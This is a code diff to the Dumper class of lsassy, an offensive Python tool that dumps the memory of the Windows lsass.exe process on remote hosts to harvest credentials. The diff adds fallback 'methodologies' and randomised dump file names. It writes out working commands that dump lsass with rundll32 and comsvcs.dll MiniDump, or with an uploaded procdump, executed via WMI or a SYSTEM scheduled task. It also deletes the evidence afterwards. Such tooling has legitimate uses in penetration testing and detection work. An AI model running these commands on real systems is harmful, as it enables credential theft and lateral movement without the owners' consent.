@@ -1,7 +1,7 @@
 import os
-import time
+import random
+import string
 
-from lsassy.log import Logger
 from lsassy.wmi import WMI
 from lsassy.taskexe import TASK_EXEC
 
@@ -13,49 +13,125 @@ class Dumper:
         self._share = "C$"
         self._procdump = "procdump.exe"
         self._procdump_path = args.procdump
-        self._remote_lsass_dump = "tmp.dmp"
+        self._method = args.method
+
+        if args.dumpname:
+            self._remote_lsass_dump = args.dumpname
+        else:
+            self._remote_lsass_dump = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
         self._conn = connection
         if args.procdump is not None:
             self._procdump_path = args.procdump
 
         self.exec_methods = {"wmi": WMI, "task": TASK_EXEC}
-        self.dump_method = None
+        self.procdump = False
 
-    def dump(self, dump_method, exec_methods=("wmi", "task")):
-        self.dump_method = dump_method
-        if dump_method == "dll":
-            self.dlldump()
-        elif dump_method == "procdump":
-            self.procdump(exec_methods)
+    def dump(self):
+        """
+        Dump lsass on remote host. Different methods can be used.
+        If you chose to dump lsass using built-in comsvcs.dll method, you need SeDebugPrivilege. This privilege
+        is either in Powershell admin context, or cmd.exe SYSTEM context.
+        Two execution methods can be used.
+        1. WMIExec with cmd.exe (no SeDebugPrivilege) or powershell.exe (SeDebugPrivilege)
+        2. ScheduledTask which is SYSTEM context (SeDebugPrivilege).
+        These constraints lead to different possibilities. By default, comsvcs.dll method will be used and will try
+        Powershell with WMI, Powershell with scheduled task, and cmd.exe with scheduled task
+        """
+
+        """
+        A "methodology can be described in an array of 3 elements:
+        1. 1st element : Dump method to use (dll, procdump)
+        2. Shell context to use (powershell, cmd)
+        3. List of remote execution methods (wmi, task)
+        """
+        if self._method == "0":
+            dump_methodologies = [
+                ["dll", "powershell", ("wmi", "task")],
+                ["dll", "cmd", ("task",)],
+                ["procdump", "cmd", ("wmi", "task")]
+            ]
+        elif self._method == "1":
+            dump_methodologies = [
+                ["dll", "powershell", ("wmi", "task")],
+                ["dll", "cmd", ("task",)]
+            ]
+        elif self._method == "2":
+            dump_methodologies = [
+                ["procdump", "cmd", ("wmi", "task")]
+            ]
+        elif self._method == "3":
+            dump_methodologies = [
+                ["dll", "powershell", ("wmi", "task")]
+            ]
+        elif self._method == "4":
+            dump_methodologies = [
+                ["dll", "cmd", ("task",)]
+            ]
         else:
-            self._log.error("Incorrect dump method. Currently supported : procdump, dll")
-            exit(1)
+            self._log.error("Method \"{}\" is not supported (0-4). See -h for help".format(self._method))
+            return False
 
-        self._log.success("Process lsass.exe is being dumped")
+        dumped = False
+        for dump_methodology in dump_methodologies:
+            dump_method, exec_shell, exec_methods = dump_methodology
+            self._log.debug("Trying {} method".format(dump_method))
+            if dump_method == "dll":
+                dumped = self.dll_dump(exec_methods, exec_shell)
+            elif dump_method == "procdump":
+                dumped = self.procdump_dump(exec_methods)
+            else:
+                self._log.error("Incorrect dump method \"{}\". Currently supported : procdump, dll".format(dump_method))
+                continue
+            if dumped:
+                break
+
+        if not dumped:
+            return False
+
         return (self._share + self._tmp_dir + self._remote_lsass_dump).replace("\\", "/")
 
-    def dlldump(self):
-        """
-        Dump lsass with rundll32 as SYSTEM
-        WMIEXEC is not run as SYSTEM, so a task is created as SYSTEM, run and deleted
-        """
+    def dll_dump(self, exec_methods=("wmi", "task"), exec_shell="cmd"):
         try:
             self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
             self._log.debug("Old lsass dump was removed")
         except:
             pass
-        self._log.info("Using DLL Method (default)")
-        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
-            self._tmp_dir, self._remote_lsass_dump
-        )
-        TASK_EXEC(self._conn, self._log).execute(command)
 
-    def procdump(self, exec_methods):
+        if exec_shell == "cmd":
+            command = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump ^%B {}{} full""".format(
+                self._tmp_dir, self._remote_lsass_dump
+            )
+        elif exec_shell == "powershell":
+            command = 'powershell.exe -NoP -C "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id {}{} full;Wait-Process -Id (Get-Process rundll32).id"'.format(
+                self._tmp_dir, self._remote_lsass_dump)
+        else:
+            self._log.error("Shell {} is not supported".format(exec_shell))
+            return False
+
+        self._log.debug("Command : {}".format(command))
+
+        exec_completed = False
+
+        while not exec_completed:
+            for exec_method in exec_methods:
+                try:
+                    self._log.debug("Trying exec method : \"{}\"".format(exec_method))
+                    self.exec_methods[exec_method](self._conn, self._log).execute(command)
+                    self._log.debug("Exec method \"{}\" success !".format(exec_method))
+                    return True
+                except Exception as e:
+                    self._log.debug("Exec method {} failed.".format(exec_method))
+            return False
+
+    def procdump_dump(self, exec_methods=("wmi", "task")):
         """
         Dump lsass with procdump
         :param exec_methods: If set, it will use specified execution method. Default to WMI, then TASK
         """
         self._log.info("Using Procdump Method")
+        if not self._procdump_path:
+            self._log.error("Procdump path has not been provided")
+            return False
         # Verify procdump exists on host
         if not os.path.exists(self._procdump_path):
             self._log.error("{} does not exist.".format(self._procdump_path))
@@ -65,9 +141,10 @@ class Dumper:
         self._log.debug('Copy {} to {}'.format(self._procdump_path, self._tmp_dir))
         with open(self._procdump_path, 'rb') as procdump:
             self._conn.putFile(self._share, self._tmp_dir + self._procdump, procdump.read)
+        self.procdump = True
 
         # Dump lsass using PID
-        command = """for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
+        command = """cmd.exe /Q /c for /f "tokens=1,2 delims= " ^%A in ('"tasklist /fi "Imagename eq lsass.exe" | find "lsass""') do {}{} -accepteula -o -ma ^%B {}{}""".format(
             self._tmp_dir, self._procdump, self._tmp_dir, self._remote_lsass_dump
         )
         self._log.debug('Dumping lsass.exe')
@@ -78,26 +155,19 @@ class Dumper:
                 try:
                     self._log.debug("Trying exec method : " + m)
                     self.exec_methods[m](self._conn, self._log).execute(command)
-                    exec_completed = True
-                    break
+                    return True
                 except Exception as e:
                     self._log.debug("Error : {}".format(str(e)))
-            if not exec_completed:
-                self._log.error("Could not dump lsass")
-                exit(1)
+            return False
 
     def clean(self):
-        if self.dump_method is None:
-            self._log.error("Nothing to clean")
-            exit(1)
-
         try:
             self._conn.deleteFile(self._share, self._tmp_dir + self._remote_lsass_dump)
             self._log.success('Deleted lsass dump')
         except Exception as e:
             self._log.error('Error deleting lsass dump : {}'.format(e))
 
-        if self.dump_method == "procdump":
+        if self.procdump:
             # Delete procdump.exe
             try:
                 self._conn.deleteFile(self._share, self._tmp_dir + self._procdump)
